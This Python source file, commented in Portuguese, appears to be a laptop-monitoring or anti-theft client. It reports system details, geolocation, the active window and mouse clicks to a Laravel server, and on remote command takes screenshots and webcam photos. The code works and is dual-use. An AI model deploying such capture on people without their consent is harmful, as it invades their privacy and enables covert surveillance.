import threading
import time
import requests
import json
import base64
import os
import platform
import socket
import io
from datetime import datetime
from PIL import Image, ImageGrab
import cv2
import numpy as np
from pynput import mouse
from pynput.mouse import Listener as MouseListener
import re
import psutil
import getpass
import uuid
import subprocess
import sys

class PIPAMonitor:
    def __init__(self, laravel_url, notebook_id):
        self.laravel_url = laravel_url.rstrip('/')
        self.notebook_id = notebook_id
        self.session = requests.Session()
        self.csrf_token = None
        
        # Dados do sistema
        self.dados_sistema = self.capturar_info_completa_sistema()
        self.dados_sistema['notebook_id'] = notebook_id
        self.dados_sistema['status'] = 'ativo'
        
        # Históricos
        self.historico_cliques = []
        
        # Controles
        self.monitorando = True
        self.servidor_online = False
        self.ultima_atividade = datetime.now()
        self.contador_heartbeat = 0
        self.contador_tentativas = 0
        self.max_tentativas = 3
        
        # Cache de comandos
        self.comandos_executados = set()
        
        # Listeners
        self.mouse_listener = None
        
        print(f"[PIPA] Monitor iniciado - Notebook {notebook_id}")
        print(f"[PIPA] Enviando dados para: {laravel_url}")

    def verificar_conexao_servidor(self):
        # Verifica se o servidor laravel esta online
        try:
            test_url = f"{self.laravel_url}/api/test"
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                if not self.servidor_online:
                    print(f"[CONEXAO] Ok Servidor encontrado! Retomando operação...")
                self.servidor_online = True
                self.contador_tentativas = 0
                return True
        except Exception as e:
            if self.servidor_online:
                print(f"[CONEXAO] Servidor offline tentando nova conexão em breve: {e}")
            self.servidor_online = False
        return False

    def aguardar_conexao(self):
        # caso o servidor esteja offiline aguarda e tenta reconetar
        while self.monitorando and not self.verificar_conexao_servidor():
            self.contador_tentativas += 1
            print(f"[CONEXAO] Tentativa {self.contador_tentativas} - Reconectando em 20 segundos...")
            
            # aguarda 20 segundos
            for i in range(20):
                if not self.monitorando:
                    return False
                time.sleep(1)
        
        return self.servidor_online # tenta verificar se o servidor esta olina

    def obter_localizacao(self):
        # tenta obter a localização via geocoder ou api publica
        try:
            try:
                import geocoder
                g = geocoder.ip('me')
                if g.ok:
                    return {
                        'cidade': g.city,
                        'estado': g.state,
                        'pais': g.country,
                        'lat': g.lat,
                        'lng': g.lng,
                        'ip_publico': g.ip,
                        'provedor': 'geocoder',
                        'timestamp': datetime.now().isoformat()
                    }
            except ImportError:
                print("[LOCALIZACAO] Geocoder não disponível, usando API alternativa")
            
            # caso o geocoder falhe tenta usar uma api publica secundaria
            response = requests.get('http://ip-api.com/json/', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data['status'] == 'success':
                    return {
                        'cidade': data.get('city', 'N/A'),
                        'estado': data.get('regionName', 'N/A'),
                        'pais': data.get('country', 'N/A'),
                        'lat': data.get('lat', 0),
                        'lng': data.get('lon', 0),
                        'ip_publico': data.get('query', 'N/A'),
                        'provedor': data.get('isp', 'N/A'),
                        'provedor': 'ip-api',
                        'timestamp': datetime.now().isoformat()
                    }
                    
        except Exception as e:
            print(f"[LOCALIZACAO] Erro: {e}")
        
        # caso ambas de erro mostra mensagem generica
        return {
            'cidade': 'Não detectada',
            'estado': 'N/A',
            'pais': 'N/A',
            'ip_publico': self.get_public_ip(),
            'provedor': 'fallback',
            'timestamp': datetime.now().isoformat()
        }

    def get_public_ip(self):
        # obetem o ip publico
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            return "Não disponível"

    # funcao para obter o aplicativo ativo 
    def obter_aplicativo_ativo(self):
        try:
            if platform.system() == 'Windows':
                import win32gui
                import win32process
                
                hwnd = win32gui.GetForegroundWindow()
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                
                processo = psutil.Process(pid)
                nome_aplicativo = processo.name()
                titulo_janela = win32gui.GetWindowText(hwnd)
                
                return {
                    'pid': pid,
                    'nome_processo': nome_aplicativo,
                    'titulo_janela': titulo_janela,
                    'timestamp': datetime.now().isoformat()
                }
            else:
                return {
                    'nome_processo': 'Sistema não Windows',
                    'titulo_janela': 'N/A',
                    'timestamp': datetime.now().isoformat()
                }
                
        except Exception as e:
            return {
                'nome_processo': 'Desconhecido',
                'titulo_janela': 'Não disponível',
                'timestamp': datetime.now().isoformat()
            }

    # captura informacoes completas do sistema
    def capturar_info_completa_sistema(self):
        try:
            hostname = platform.node()
            sistema_operacional = f"{platform.system()} {platform.release()}"
            usuario = getpass.getuser()
            ip_address = self.get_ip_address()
            
            # faz a chamada para a função de obter o aplicativo atual
            aplicativo_atual = self.obter_aplicativo_ativo()
            
            # faz a chamada para a função de obter localização
            localizacao = self.obter_localizacao()
            
            # coleta informações do hardware
            memoria = psutil.virtual_memory()
            disco = psutil.disk_usage('/' if platform.system() != 'Windows' else 'C:')
            
            return {
                'hostname': hostname,
                'usuario': usuario,
                'sistema_operacional': sistema_operacional,
                'ip_address': ip_address,
                'aplicativo_atual': aplicativo_atual,
                'localizacao': localizacao,
                'hardware': {
                    'memoria_total': round(memoria.total / (1024**3), 2),
                    'memoria_usada': round(memoria.used / (1024**3), 2),
                    'memoria_percent': memoria.percent,
                    'disco_total': round(disco.total / (1024**3), 2),
                    'disco_usado': round(disco.used / (1024**3), 2),
                    'disco_percent': disco.percent,
                    'cpu_percent': psutil.cpu_percent(interval=1)
                },
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            print(f"[SISTEMA] Erro: {e}")
            return {
                'hostname': platform.node(),
                'usuario': getpass.getuser(),
                'sistema_operacional': f"{platform.system()} {platform.release()}",
                'ip_address': self.get_ip_address(),
                'localizacao': self.obter_localizacao(),
                'timestamp': datetime.now().isoformat()
            }

    def get_ip_address(self):
        #obtem o ip local
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except:
            return "127.0.0.1"

    def obter_token_csrf(self):
        # colete o token CSRF do laravel
        if not self.servidor_online:
            return False
            
        try:
            url = f"{self.laravel_url}/api/csrf-token"
            print(f"[CSRF] Obtendo token CSRF...")
            
            response = self.session.get(url)
            
            if response.status_code == 200:
                data = response.json()
                self.csrf_token = data.get('csrf_token')
                print(f"[CSRF] Token obtido")
                return True
            else:
                print(f"[CSRF]  Erro: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[CSRF]  Erro: {e}")
            return False

    # faz a requisicao para o servidor
    def fazer_requisicao(self, metodo, endpoint, dados=None):
        if not self.servidor_online:
            print(f"[REQUISICAO] Servidor offline, requisição cancelada")
            return None
            
        url = f"{self.laravel_url}/api{endpoint}"
        
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'User-Agent': 'PIPAMonitor/1.0'
        }
        
        if self.csrf_token:
            headers['X-CSRF-TOKEN'] = self.csrf_token
        
        print(f"[REQUISICAO] {metodo} {endpoint}")
        
        try:
            if metodo.upper() == 'POST':
                if dados and 'dados' in dados:
                    dados_log = dados.copy()
                    dados_log['dados'] = f"[BASE64_DATA:{len(dados['dados'])}bytes]"
                    print(f"[REQUISICAO] Dados: {json.dumps(dados_log, indent=2)}")
                
                response = self.session.post(
                    url, 
                    json=dados, 
                    headers=headers, 
                    timeout=30
                )
                
                print(f"[REQUISICAO] Status: {response.status_code}")
                
                if response.status_code != 200:
                    print(f"[REQUISICAO] Erro: {response.text[:200]}")
                else:
                    print(f"[REQUISICAO] Sucesso!")
                    
                return response
                
            elif metodo.upper() == 'GET':
                response = self.session.get(url, headers=headers, timeout=10)
                return response
            else:
                raise ValueError(f"Método {metodo} não suportado")
            
        except requests.exceptions.RequestException as e:
            print(f"[REQUISICAO]  Erro de conexão: {e}")
            self.servidor_online = False
            return None
        except Exception as e:
            print(f"[REQUISICAO]  Erro inesperado: {e}")
            return None

    # captura uma print da tela
    def catura_print(self):
        try:
            screenshot = ImageGrab.grab()
            
            # Redimensiona
            largura_original, altura_original = screenshot.size
            nova_largura = 1000
            nova_altura = int((nova_largura / largura_original) * altura_original)
            
            if largura_original > nova_largura:
                screenshot = screenshot.resize((nova_largura, nova_altura), Image.Resampling.LANCZOS)
            
            # Converte para JPEG
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='JPEG', quality=70, optimize=True)
            img_str = base64.b64encode(img_buffer.getvalue()).decode()
            
            tamanho_kb = len(img_str) / 1024
            print(f"[SCREEN] Capturado - {tamanho_kb:.1f} KB")
            return img_str
            
        except Exception as e:
            print(f"[SCREEN] Erro: {e}")
            return None

    # tira uma foto usando a webcam
    def capturar_webcam(self):
        try:
            # tenta acessar a webcam
            cap = cv2.VideoCapture(0)
            
            if not cap.isOpened():
                print("[WEBCAM] Não foi possível abrir a webcam")
                return None
            
            # configura qualidade da captura
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            cap.set(cv2.CAP_PROP_FPS, 30)
            
            # Lê um frame
            ret, frame = cap.read()
            
            if not ret:
                print("[WEBCAM] Não foi possível ler o frame da webcam")
                cap.release()
                return None
            
            # Libera a webcam
            cap.release()
            
            # Converte BGR (OpenCV) para RGB
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            image = Image.fromarray(frame_rgb)
            
            # Redimensiona para otimizar
            largura_original, altura_original = image.size
            nova_largura = 800
            nova_altura = int((nova_largura / largura_original) * altura_original)
            
            if largura_original > nova_largura:
                image = image.resize((nova_largura, nova_altura), Image.Resampling.LANCZOS)
            
            # Converte para JPEG
            img_buffer = io.BytesIO()
            image.save(img_buffer, format='JPEG', quality=70, optimize=True)
            img_str = base64.b64encode(img_buffer.getvalue()).decode()
            
            tamanho_kb = len(img_str) / 1024
            print(f"[WEBCAM] Capturado - {tamanho_kb:.1f} KB")
            return img_str
            
        except Exception as e:
            print(f"[WEBCAM] Erro: {e}")
            return None

    # captura cliques do mouse
    def mouse_on_click(self, x, y, button, pressed):
        if pressed:
            try:
                self.ultima_atividade = datetime.now()
                
                app_info = self.obter_aplicativo_ativo()
                aplicativo = app_info.get('nome_processo', 'Desconhecido')
                
                clique_info = {
                    'x': x,
                    'y': y,
                    'botao': str(button),
                    'aplicativo': aplicativo,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.historico_cliques.append(clique_info)
                print(f"[MOUSE] Clique em ({x}, {y}) em {aplicativo}")
                
            except Exception as e:
                print(f"[MOUSE] Erro: {e}")

    # envia sinal de vida para o servidor
    def enviar_heartbeat(self):
        if not self.servidor_online:
            print(f"[HEARTBEAT]  Servidor offline, heartbeat cancelado")
            return
            
        try:
            self.contador_heartbeat += 1
            
            # atualiza informações a cada 3 heartbeats
            if self.contador_heartbeat % 3 == 0:
                self.dados_sistema.update(self.capturar_info_completa_sistema())
            
            heartbeat_data = {
                'notebook_id': self.notebook_id,
                'status': 'ativo',
                'usuario': self.dados_sistema['usuario'],
                'ip_address': self.dados_sistema['ip_address'],
                'hostname': self.dados_sistema['hostname'],
                'sistema_operacional': self.dados_sistema['sistema_operacional'],
                'info_sistema': self.dados_sistema,
                'historico_cliques': self.historico_cliques[-30:],    # Últimos 30 cliques
                'localizacao': self.dados_sistema.get('localizacao', {}),
                'timestamp': datetime.now().isoformat()
            }
            
            print(f"[HEARTBEAT] #{self.contador_heartbeat} - Localização: {self.dados_sistema.get('localizacao', {}).get('cidade', 'N/A')}")
            
            response = self.fazer_requisicao('POST', '/notebook/heartbeat', heartbeat_data)
            
            if response and response.status_code == 200:
                print(f"[HEARTBEAT] Dados enviados com sucesso")
                # limpa histórico após envio bem-sucedido
                self.historico_cliques = []
            else:
                status = response.status_code if response else 'N/A'
                print(f"[HEARTBEAT] Falha: {status}")
                
        except Exception as e:
            print(f"[HEARTBEAT]  Erro: {e}")

    # verifica os comandos enviados pelo servidor
    def verificar_comandos_servidor(self):
        if not self.servidor_online:
            return
            
        try:
            endpoint = f'/notebook/{self.notebook_id}/comandos'
            response = self.fazer_requisicao('GET', endpoint)
            
            if response and response.status_code == 200:
                comandos = response.json()
                print(f"[COMANDOS] {len(comandos)} comando(s) recebido(s)")
                
                if comandos:
                    # filtra os comandos ja executados
                    novos_comandos = []
                    for comando in comandos:
                        comando_id = comando.get('id')
                        if comando_id and comando_id not in self.comandos_executados:
                            novos_comandos.append(comando)
                            self.comandos_executados.add(comando_id)
                    
                    if novos_comandos:
                        print(f"[COMANDOS] {len(novos_comandos)} novo(s) comando(s)")
                        threading.Thread(
                            target=self.executar_comandos, 
                            args=(novos_comandos,), 
                            daemon=True
                        ).start()
                    
        except Exception as e:
            print(f"[COMANDOS] Erro: {e}")

    # executa os comandos recebidos do servidor
    def executar_comandos(self, comandos):
        for comando in comandos:
            acao = comando.get('acao')
            comando_id = comando.get('id')
            
            print(f"[COMANDOS] ⚡ Executando: {acao} (ID: {comando_id})")
            
            inicio = time.time()
            
            if acao == 'screenshot':
                resultado = self.executar_screenshot(comando_id)
            elif acao == 'webcam':
                resultado = self.executar_webcam(comando_id)
            else:
                print(f"[COMANDOS] Comando desconhecido: {acao}")
                continue
            
            tempo_execucao = time.time() - inicio
            print(f"[COMANDOS] {acao} concluído em {tempo_execucao:.1f}s")

    # executa a print e envia para o servidor
    def executar_screenshot(self, comando_id):
        try:
            print(f"[SCREEN] Iniciando captura...")
            
            screenshot = self.catura_print()
            
            if not screenshot:
                print(f"[SCREEN] Falha na captura")
                return False
            
            payload = {
                'notebook_id': self.notebook_id,
                'tipo': 'screenshot',
                'dados': screenshot,
                'comando_id': comando_id,
                'limpar_anterior': True,
                'timestamp': datetime.now().isoformat()
            }
            
            response = self.fazer_requisicao('POST', '/notebook/midia', payload)
            
            if response is None:
                print(f"[SCREEN] Nenhuma resposta do servidor")
                return False
                
            if response.status_code == 200:
                print(f"[SCREEN] Screenshot enviado com sucesso!")
                return True
            else:
                print(f"[SCREEN] Erro HTTP {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[SCREEN] Erro: {e}")
            return False

    # executa a captura da webcam e envia para o servidor
    def executar_webcam(self, comando_id):
        try:
            print(f"[WEBCAM] Iniciando captura...")
            
            webcam_image = self.capturar_webcam()
            
            if not webcam_image:
                print(f"[WEBCAM] Falha na captura")
                return False
            
            payload = {
                'notebook_id': self.notebook_id,
                'tipo': 'webcam',
                'dados': webcam_image,
                'comando_id': comando_id,
                'limpar_anterior': True,
                'timestamp': datetime.now().isoformat()
            }
            
            response = self.fazer_requisicao('POST', '/notebook/midia', payload)
            
            if response is None:
                print(f"[WEBCAM] Nenhuma resposta do servidor")
                return False
                
            if response.status_code == 200:
                print(f"[WEBCAM] Imagem enviada com sucesso!")
                return True
            else:
                print(f"[WEBCAM] Erro HTTP {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[WEBCAM] Erro: {e}")
            return False

    # loop principal para mandar os sinais de vida 
    def heartbeat_loop(self):
        while self.monitorando:
            try:
                # verifica se o servidor esta online
                if not self.servidor_online:
                    print(f"[PIPA] Verificando conexão com servidor...")
                    if self.aguardar_conexao():
                        self.obter_token_csrf()
                
                # se servidor esta online executa operações normais
                if self.servidor_online:
                    self.enviar_heartbeat()
                    self.verificar_comandos_servidor()
                    time.sleep(30) 
                else:
                    time.sleep(5)
                    
            except Exception as e:
                print(f"[LOOP] Erro: {e}")
                time.sleep(10)

    # inicia o monitoramento principal
    def iniciar_monitoramento(self):
        print("[PIPA] Iniciando configuração...")
        
        # aguarda conexão inicial com servidor
        if not self.aguardar_conexao():
            print("[PIPA] Não foi possível conectar ao servidor inicialmente")
            return
        
        if not self.obter_token_csrf():
            print("[PIPA] Continuando sem CSRF token...")
        
        try:
            self.mouse_listener = MouseListener(on_click=self.mouse_on_click)
            self.mouse_listener.start()
            
            print("[LISTENERS] Monitor de mouse iniciado")
        except Exception as e:
            print(f"[LISTENERS] Erro: {e}")
        
        # Inicia sinais de vida
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        
        # mostra informações iniciais no terminal
        localizacao = self.dados_sistema.get('localizacao', {})
        print(f"[PIPA] Monitoramento ativo")
        print(f"[PIPA] Localização: {localizacao.get('cidade', 'N/A')}, {localizacao.get('estado', 'N/A')}")
        print(f"[PIPA] IP Público: {localizacao.get('ip_publico', 'N/A')}")
        print(f"[PIPA] Aguardando comandos...")
        print(f"[PIPA] Reconexão automática ativada (20 segundos)")
        
        try:
            while self.monitorando:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[PIPA] Encerrando...")
            self.monitorando = False

if __name__ == "__main__":
    LARAVEL_URL = "http://localhost:8000"       # ajuste para a url do servidor 
    NOTEBOOK_ID = "Notebook Acer Nitro 5"            # ajuste o nome para identificar a maquina que sera executada o script 
    
    # verifica se as dependências estao funcionando
    print("[INICIO] Verificando dependências...")
    
    try:
        # importar geocoder
        try:
            import geocoder
            print("[DEPENDENCIAS] Geocoder disponível")
        except ImportError:
            print("[DEPENDENCIAS] Geocoder não instalado, usando API alternativa")
            print("[DEPENDENCIAS] Para melhor precisão: pip install geocoder")
        
        if platform.system() == 'Windows':
            try:
                import win32gui
                import win32process
                print("[DEPENDENCIAS] Módulos Windows disponíveis")
            except ImportError:
                print("[DEPENDENCIAS] Módulos Windows não instalados")
                print("[DEPENDENCIAS] Instale: pip install pywin32")
        
    except Exception as e:
        print(f"[DEPENDENCIAS] Erro: {e}")
    
    # Inicia o script
    print("[INICIO] Iniciando monitor PIPA...")
    monitor = PIPAMonitor(LARAVEL_URL, NOTEBOOK_ID)
    monitor.iniciar_monitoramento()